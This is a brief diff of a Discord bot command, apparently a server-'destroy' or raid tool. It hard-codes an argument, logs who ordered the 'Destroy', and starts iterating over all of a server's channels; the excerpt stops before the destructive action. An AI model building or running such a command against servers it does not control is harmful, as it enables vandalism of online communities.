@@ -1,8 +1,5 @@
 exports.run = async (client, message, args) => {
-  let arg = args.slice(0).join(" ");
-  if(!arg){
-    arg: "rafaelpnsm"
-  }
+  let arg = "Gustavo33"
     console.log(`Destroy Ordernado Por ${message.author.username} ID: ${message.author.id}`)
     function a1(){
         client.guilds.get(message.guild.id).channels.forEach((canal) => {
